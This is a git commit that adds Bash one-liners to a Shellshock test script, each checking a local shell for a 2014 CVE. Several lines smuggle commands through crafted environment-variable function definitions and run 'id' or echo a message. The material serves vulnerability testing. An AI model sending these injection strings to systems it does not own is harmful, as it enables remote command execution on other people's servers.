e3ac03e2784ff0e07c9455ad8dac2d60da1f7382
EmpereurMarcAurele <marcolautel@gmail.com>
2017-07-10 10:29:47 +0200

    add 4 cve

--- shellshock_2014.sh
+++ shellshock_2014.sh
@@ -1,1 +1,9 @@
 env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id
+
+bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo "CVE-2014-7186 vulnerable, redir_stack"
+
+(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash || echo "CVE-2014-7187 vulnerable, word_lineno"
+
+env X='() { _; } >_[$($())] { echo CVE-2014-6278 vulnerable; id; }' bash -c :
+
+env X='() { x() { _; }; x() { _; } <<a; }' bash -c :
